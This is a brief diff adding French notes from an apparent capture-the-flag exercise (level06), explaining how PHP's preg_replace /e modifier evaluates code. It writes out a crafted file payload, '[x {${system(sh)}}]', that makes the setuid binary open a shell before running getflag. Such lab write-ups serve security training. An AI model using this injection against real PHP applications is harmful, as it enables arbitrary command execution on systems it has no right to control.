@@ -1,0 +1,7 @@
+reg_replqce /e execute le 2eme argument
+donc on cree un fichier avec le match du premier argument
+puis on met la fonction systeme(sh) en 2eme arg
+ca ouvre un shell
+echo '[x {${system(sh)}}]' > /tmp/coucou
+./level06 /tmp/coucou
+puis getflag
